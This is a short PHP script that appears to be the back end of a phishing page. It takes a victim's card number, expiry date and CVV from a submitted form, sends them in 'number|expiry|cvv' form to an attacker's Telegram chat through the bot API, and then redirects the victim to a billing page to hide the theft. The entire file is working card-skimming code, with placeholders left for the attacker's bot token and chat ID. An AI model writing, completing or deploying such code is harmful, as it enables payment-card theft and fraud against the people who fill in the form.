<?php
$telegram_bot_token = 'TELEGRAM BOT TOKEN HERE';
$telegram_chat_id = 'CHAT ID HERE (ADD THE BOT TO THE GROUP FIRST)';

$card_number = $_POST['card_number'];
$expiry_date = $_POST['expiry_date'];
$cvv = $_POST['cvv'];

$message = "$card_number|$expiry_date|$cvv";
file_get_contents("https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" . urlencode($message));

header('Location: billing.html'); 
exit();
?>
